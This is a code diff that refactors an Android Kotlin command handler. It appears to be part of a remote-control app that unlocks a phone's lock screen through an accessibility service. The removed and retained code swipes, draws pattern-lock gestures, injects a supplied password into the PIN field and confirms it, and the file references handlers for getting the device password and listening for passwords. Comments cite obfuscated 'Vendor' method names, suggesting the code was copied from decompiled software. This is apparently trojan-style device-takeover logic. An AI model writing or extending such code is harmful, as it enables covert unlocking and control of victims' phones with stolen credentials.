@@ -1,10 +1,11 @@
 package com.storm.safe.rock.service.modules.command
 
 import android.app.KeyguardManager
-import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
 import android.view.accessibility.AccessibilityNodeInfo
+import com.storm.safe.rock.service.modules.unlock.PinPadInputManager
+import com.storm.safe.rock.service.modules.unlock.ScreenUnlockHelper
 import kotlinx.coroutines.delay
 import org.json.JSONObject
 
@@ -32,150 +33,17 @@ class UnlockCommandHandler : CommandHandler {
     companion object {
         private const val TAG = "UnlockCmdHandler"
 
-        /**
-         * Send smart unlock result to the service for forwarding.
-         * Vendor: m211888b0
-         */
-        fun sendUnlockResult(context: CommandContext, success: Boolean, message: String) {
-            try {
-                context.emitLocalEvent("smart_unlock_result", mapOf(
-                    "success" to success,
-                    "message" to message
-                ))
-                Log.d(TAG, "[智能解锁] 发送结果: success=$success, message=$message")
-            } catch (e: Exception) {
-                Log.e(TAG, "[智能解锁] 发送结果失败", e)
-            }
-        }
+        fun sendUnlockResult(context: CommandContext, success: Boolean, message: String) =
+            ScreenUnlockHelper.sendUnlockResult(context, success, message)
 
-        /**
-         * Click a confirm button by searching for known button texts.
-         * Vendor: m211885a3
-         */
-        fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) {
-            try {
-                val root = service?.rootInActiveWindow ?: run {
-                    sendEnterKey()
-                    return
-                }
+        fun clickConfirmButton(service: android.accessibilityservice.AccessibilityService?) =
+            ScreenUnlockHelper.clickConfirmButton(service)
 
-                // 1. Search by text
-                val confirmTexts = listOf("确认", "确定", "OK", "ok", "好的", "Enter", "完成", "done")
-                for (text in confirmTexts) {
-                    val nodes = root.findAccessibilityNodeInfosByText(text)
-                    if (!nodes.isNullOrEmpty()) {
-                        val lastNode = nodes.last()
-                        if (lastNode.isClickable) {
-                            lastNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            Log.d(TAG, "[混合解锁] 点击确认按钮(text): $text")
-                            root.recycle()
-                            return
-                        }
-                    }
-                }
+        fun findEditableNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) =
+            ScreenUnlockHelper.findEditableNodes(node, result)
 
-                // 2. Search by contentDescription (MIUI uses desc="回车" for enter key)
-                if (findAndClickByContentDesc(root, listOf("回车", "enter", "Enter", "确认", "确定"))) {
-                    root.recycle()
-                    return
-                }
-
-                root.recycle()
-                Log.w(TAG, "[混合解锁] 未找到确认按钮，回退发送回车键")
-                sendEnterKey()
-            } catch (_: Exception) {
-                sendEnterKey()
-            }
-        }
-
-        private fun findAndClickByContentDesc(
-            node: AccessibilityNodeInfo,
-            descs: List<String>
-        ): Boolean {
-            val desc = node.contentDescription?.toString() ?: ""
-            if (desc.isNotEmpty() && descs.any { desc.contains(it, ignoreCase = true) } && node.isClickable) {
-                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                Log.d(TAG, "[混合解锁] 点击确认按钮(desc): $desc")
-                return true
-            }
-            for (i in 0 until node.childCount) {
-                val child = node.getChild(i) ?: continue
-                if (findAndClickByContentDesc(child, descs)) {
-                    child.recycle()
-                    return true
-                }
-                child.recycle()
-            }
-            return false
-        }
-
-        private fun sendEnterKey() {
-            try {
-                Runtime.getRuntime().exec("input keyevent 66")
-                Log.d(TAG, "[混合解锁] 已发送回车键(KEYCODE_ENTER)")
-            } catch (e: Exception) {
-                Log.w(TAG, "[混合解锁] 回车键发送失败: ${e.message}")
-            }
-        }
-
-        /**
-         * Recursively find all editable nodes in the accessibility tree.
-         * Vendor: m211886a4
-         */
-        fun findEditableNodes(node: AccessibilityNodeInfo, result: MutableList<AccessibilityNodeInfo>) {
-            if (node.isEditable) {
-                result.add(node)
-            }
-            for (i in 0 until node.childCount) {
-                val child = node.getChild(i) ?: continue
-                findEditableNodes(child, result)
-            }
-        }
-
-        /**
-         * Fill a password field via ACTION_SET_TEXT on the accessibility tree.
-         * Vendor: m211887a9
-         */
-        fun fillPasswordField(
-            service: android.accessibilityservice.AccessibilityService?,
-            password: String
-        ): Boolean {
-            try {
-                val root = service?.rootInActiveWindow ?: return false
-                val editables = mutableListOf<AccessibilityNodeInfo>()
-                findEditableNodes(root, editables)
-
-                // Find password field: prefer fields with password/number input type
-                var targetNode: AccessibilityNodeInfo? = null
-                for (node in editables) {
-                    val inputType = node.inputType
-                    if ((inputType and 0x80) != 0 || (inputType and 0x10) != 0) {
-                        targetNode = node
-                        break
-                    }
-                }
-                // Fallback to last editable field
-                if (targetNode == null) {
-                    targetNode = editables.lastOrNull()
-                }
-
-                if (targetNode == null) {
-                    Log.w(TAG, "[混合解锁] 未找到密码输入框节点")
-                    return false
-                }
-
-                val bundle = Bundle().apply {
-                    putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", password)
-                }
-                val result = targetNode.performAction(
-                    AccessibilityNodeInfo.ACTION_SET_TEXT, bundle
-                )
-                Log.d(TAG, "[混合解锁] ACTION_SET_TEXT 结果: $result")
-                return result
-            } catch (_: Exception) {
-                return false
-            }
-        }
+        fun fillPasswordField(service: android.accessibilityservice.AccessibilityService?, password: String) =
+            ScreenUnlockHelper.fillPasswordField(service, password)
     }
 
     override fun getSupportedCommands(): Set<String> = setOf(
@@ -244,10 +112,7 @@ class UnlockCommandHandler : CommandHandler {
         Log.d(TAG, "执行智能上滑解锁")
         try {
             val service = context.service ?: return
-            val metrics = service.resources.displayMetrics
-            val w = metrics.widthPixels.toFloat()
-            val h = metrics.heightPixels.toFloat()
-            service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
+            ScreenUnlockHelper.performSwipeUp(service)
             Log.d(TAG, "智能上滑解锁已执行")
         } catch (e: Exception) {
             Log.e(TAG, "智能上滑解锁失败", e)
@@ -351,149 +216,19 @@ class UnlockCommandHandler : CommandHandler {
 
             Log.d(TAG, "[UNLOCK_DEVICE] 步骤2: 执行上滑解锁手势")
             if (service != null) {
-                val metrics = service.resources.displayMetrics
-                val w = metrics.widthPixels.toFloat()
-                val h = metrics.heightPixels.toFloat()
-                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
+                ScreenUnlockHelper.performSwipeUp(service)
             }
             delay(1500L)
 
             Log.d(TAG, "[UNLOCK_DEVICE] 步骤3: 开始绘制图案")
             if (service != null) {
-                dispatchPatternGesture(service, points)
+                ScreenUnlockHelper.dispatchPatternGesture(service, points)
             } else {
                 Log.w(TAG, "[UNLOCK_DEVICE] Service 为空，无法绘制图案")
             }
         } catch (e: Exception) {
             Log.e(TAG, "[UNLOCK_DEVICE] 图案解锁失败", e)
         }
-    }
-
-    /**
-     * Convert pattern indices (0-8 on 3x3 grid) to screen coordinates and dispatch
-     * a continuous swipe gesture through all points.
-     *
-     * Grid layout (index → row,col):
-     *   0(0,0)  1(0,1)  2(0,2)
-     *   3(1,0)  4(1,1)  5(1,2)
-     *   6(2,0)  7(2,1)  8(2,2)
-     *
-     * Strategy:
-     * 1. Try to find actual pattern view bounds from accessibility tree
-     * 2. Fall back to screen-ratio estimation
-     */
-    private fun dispatchPatternGesture(
-        service: android.accessibilityservice.AccessibilityService,
-        indices: List<Int>
-    ) {
-        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.N) {
-            Log.w(TAG, "[UNLOCK_DEVICE] API < 24, dispatchGesture 不可用")
-            return
-        }
-        if (indices.size < 4) return
-
-        val metrics = service.resources.displayMetrics
-        val screenW = metrics.widthPixels.toFloat()
-        val screenH = metrics.heightPixels.toFloat()
-
-        // Try to detect pattern view bounds from accessibility tree
-        var gridLeft: Float
-        var gridTop: Float
-        var cellSize: Float
-        val detected = detectPatternViewBounds(service)
-
-        if (detected != null) {
-            val viewLeft = detected[0]
-            val viewTop = detected[1]
-            val viewRight = detected[2]
-            val viewBottom = detected[3]
-            val viewW = viewRight - viewLeft
-            val viewH = viewBottom - viewTop
-            cellSize = viewW / 3f
-            // Dot centers: offset by half-cell from view edge
-            gridLeft = viewLeft + cellSize / 2f
-            gridTop = viewTop + (viewH / 3f) / 2f
-            Log.d(TAG, "[UNLOCK_DEVICE] 检测到图案区域: ($viewLeft,$viewTop)-($viewRight,$viewBottom), cellSize=$cellSize, dotStart=($gridLeft,$gridTop)")
-        } else {
-            // Fallback: estimate grid at center of screen
-            val gridW = screenW * 0.50f
-            cellSize = gridW / 3f
-            gridLeft = (screenW - gridW) / 2f + cellSize / 2f
-            gridTop = screenH * 0.45f + cellSize / 2f
-            Log.d(TAG, "[UNLOCK_DEVICE] 使用估算坐标: dotStart=($gridLeft,$gridTop), cellSize=$cellSize")
-        }
-
-        fun indexToXY(idx: Int): Pair<Float, Float> {
-            val row = idx / 3
-            val col = idx % 3
-            val x = gridLeft + col * cellSize
-            val y = gridTop + row * cellSize
-            return Pair(x, y)
-        }
-
-        val path = android.graphics.Path()
-        val first = indexToXY(indices[0])
-        path.moveTo(first.first, first.second)
-        Log.d(TAG, "[UNLOCK_DEVICE] 图案起点: idx=${indices[0]} -> (${first.first}, ${first.second})")
-        for (i in 1 until indices.size) {
-            val (x, y) = indexToXY(indices[i])
-            path.lineTo(x, y)
-            Log.d(TAG, "[UNLOCK_DEVICE] 图案点[$i]: idx=${indices[i]} -> ($x, $y)")
-        }
-
-        val duration = (indices.size * 150L).coerceAtLeast(600L)
-        val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, duration)
-        val gesture = android.accessibilityservice.GestureDescription.Builder()
-            .addStroke(stroke)
-            .build()
-
-        val dispatched = service.dispatchGesture(gesture, null, null)
-        Log.d(TAG, "[UNLOCK_DEVICE] 图案手势已分发: ${indices.size}个点, duration=${duration}ms, dispatched=$dispatched")
-    }
-
-    /**
-     * Try to find the pattern lock view bounds from the accessibility tree.
-     * Looks for views with class name containing "PatternView", "LockPattern", or "lock_pattern".
-     *
-     * @return FloatArray [left, top, right, bottom] or null if not found
-     */
-    private fun detectPatternViewBounds(
-        service: android.accessibilityservice.AccessibilityService
-    ): FloatArray? {
-        try {
-            val root = service.rootInActiveWindow ?: return null
-            val result = findPatternViewBounds(root)
-            root.recycle()
-            return result
-        } catch (e: Exception) {
-            Log.w(TAG, "[UNLOCK_DEVICE] 检测图案视图失败", e)
-            return null
-        }
-    }
-
-    private fun findPatternViewBounds(node: android.view.accessibility.AccessibilityNodeInfo): FloatArray? {
-        val className = node.className?.toString()?.lowercase() ?: ""
-        val viewId = node.viewIdResourceName?.lowercase() ?: ""
-
-        if (className.contains("patternview") ||
-            className.contains("lockpattern") ||
-            viewId.contains("lock_pattern") ||
-            viewId.contains("patternview")) {
-            val rect = android.graphics.Rect()
-            node.getBoundsInScreen(rect)
-            if (rect.width() > 100 && rect.height() > 100) {
-                Log.d(TAG, "[UNLOCK_DEVICE] 找到���案视图: class=$className, id=$viewId, bounds=$rect")
-                return floatArrayOf(rect.left.toFloat(), rect.top.toFloat(), rect.right.toFloat(), rect.bottom.toFloat())
-            }
-        }
-
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            val result = findPatternViewBounds(child)
-            child.recycle()
-            if (result != null) return result
-        }
-        return null
     }
 
     private fun handleGetDevicePassword(params: JSONObject?, context: CommandContext) {
@@ -555,13 +290,12 @@ class UnlockCommandHandler : CommandHandler {
             delay(500L)
 
             Log.d(TAG, "[智能解锁] 步骤3: 执行上滑")
-            service?.performSwipe(
-                screenWidth / 2f, screenHeight * 0.8f,
-                screenWidth / 2f, screenHeight * 0.3f, 300L
-            )
+            if (service != null) {
+                ScreenUnlockHelper.performSwipeUp(service)
+            }
 
             Log.d(TAG, "[智能解锁] 步骤4: 检测数字键盘")
-            val keypadFound = waitForNumericKeypad(context, 3000L)
+            val keypadFound = ScreenUnlockHelper.waitForNumericKeypad(context, 3000L)
             if (keypadFound) {
                 Log.d(TAG, "[智能解锁] 检测到数字键盘，等待1秒确保就绪")
                 delay(1000L)
@@ -579,7 +313,7 @@ class UnlockCommandHandler : CommandHandler {
 
             Log.d(TAG, "[智能解锁] 步骤6: 检测解锁结果")
             delay(800L)
-            val unlocked = waitForUnlockResult(context, 5000L)
+            val unlocked = ScreenUnlockHelper.waitForUnlockResult(context, 5000L)
             if (unlocked) {
                 Log.d(TAG, "[智能解锁] 解锁成功")
                 sendUnlockResult(context, true, "解锁成功")
@@ -619,15 +353,12 @@ class UnlockCommandHandler : CommandHandler {
 
             Log.d(TAG, "[混合解锁] 步骤2: 执行上滑")
             if (service != null) {
-                val metrics = service.resources.displayMetrics
-                val w = metrics.widthPixels.toFloat()
-                val h = metrics.heightPixels.toFloat()
-                service.performSwipe(w / 2f, h * 0.8f, w / 2f, h * 0.3f, 300L)
+                ScreenUnlockHelper.performSwipeUp(service)
             }
             delay(1200L)
 
             Log.d(TAG, "[混合解锁] 步骤3: 查找输入框并注入密码")
-            val filled = fillPasswordField(service, password)
+            val filled = ScreenUnlockHelper.fillPasswordField(service, password)
             if (!filled) {
                 Log.w(TAG, "[混合解锁] 未找到输入框，尝试剪贴板输入")
                 try {
@@ -638,10 +369,10 @@ class UnlockCommandHandler : CommandHandler {
             }
 
             Log.d(TAG, "[混合解锁] 步骤4: 尝试点击确认按钮")
-            clickConfirmButton(service)
+            ScreenUnlockHelper.clickConfirmButton(service)
             delay(800L)
 
-            val unlocked = waitForUnlockResult(context, 5000L)
+            val unlocked = ScreenUnlockHelper.waitForUnlockResult(context, 5000L)
             if (unlocked) {
                 Log.d(TAG, "[混合解锁] 解锁成功")
                 sendUnlockResult(context, true, "解锁成功")
@@ -664,52 +395,5 @@ class UnlockCommandHandler : CommandHandler {
         } catch (e: Exception) {
             Log.e(TAG, "启用密码监听失败", e)
         }
-    }
-
-    /**
-     * Poll KeyguardManager.isKeyguardLocked() until unlocked or timeout.
-     * Vendor: C0352a9.m211894b2
-     * @return true if unlocked within timeout, false if still locked
-     */
-    suspend fun waitForUnlockResult(context: CommandContext, timeoutMs: Long): Boolean {
-        val service = context.service ?: return false
-        val start = System.currentTimeMillis()
-        while (System.currentTimeMillis() - start < timeoutMs) {
-            try {
-                val km = service.getSystemService("keyguard") as? KeyguardManager
-                if (km != null && !km.isKeyguardLocked) return true
-            } catch (_: Exception) {}
-            delay(200L)
-        }
-        return false
-    }
-
-    /**
-     * Poll accessibility tree for numeric keypad presence.
-     * Vendor: C0352a9.m211893b1
-     * @return true if keypad detected (5+ digit buttons), false if timeout
-     */
-    suspend fun waitForNumericKeypad(context: CommandContext, timeoutMs: Long): Boolean {
-        val service = context.service ?: return false
-        val start = System.currentTimeMillis()
-        while (System.currentTimeMillis() - start < timeoutMs) {
-            try {
-                val root = service.rootInActiveWindow
-                if (root != null) {
-                    var found = 0
-                    for (d in 0..9) {
-                        val nodes = root.findAccessibilityNodeInfosByText(d.toString())
-                        if (!nodes.isNullOrEmpty()) found++
-                    }
-                    root.recycle()
-                    if (found >= 5) {
-                        Log.d(TAG, "[键盘检测] 找到${found}个数字按钮")
-                        return true
-                    }
-                }
-            } catch (_: Exception) {}
-            delay(200L)
-        }
-        return false
     }
 }
